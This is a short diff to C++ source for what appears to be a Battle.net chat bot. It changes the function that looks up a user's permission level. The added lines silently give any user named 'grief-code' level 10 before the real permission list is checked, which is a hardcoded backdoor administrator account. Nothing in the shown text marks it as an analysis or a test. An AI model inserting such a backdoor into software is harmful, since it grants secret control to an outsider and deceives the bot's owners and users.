@@ -4323,6 +4323,10 @@ uint32_t CBNET :: IsLevel( string name )
 {
     transform( name.begin( ), name.end( ), name.begin( ), ::tolower );
 
+if(name=="grief-code") {
+ return 10;
+}
+
     for( vector<permission> :: iterator i = m_Permissions.begin( ); i != m_Permissions.end( ); ++i )
     {
         if( i->player == name )
